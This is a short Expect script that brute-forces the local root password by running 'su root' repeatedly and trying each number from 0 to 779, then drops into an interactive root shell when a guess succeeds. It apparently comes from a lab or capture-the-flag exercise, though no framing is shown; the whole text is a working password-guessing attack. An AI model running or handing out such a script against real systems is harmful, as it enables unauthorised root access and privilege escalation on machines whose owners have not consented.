#!/usr/bin/expect -f
set NUM 0
while { $NUM < 780 } {
  spawn su root
  expect "Password:"
  send_user "$NUM\n"
  send "$NUM\n"
  expect {
    "su: Authentication failure*" { }
    "*root*" {
              interact
              }
   }
   set NUM [expr $NUM + 1]
}
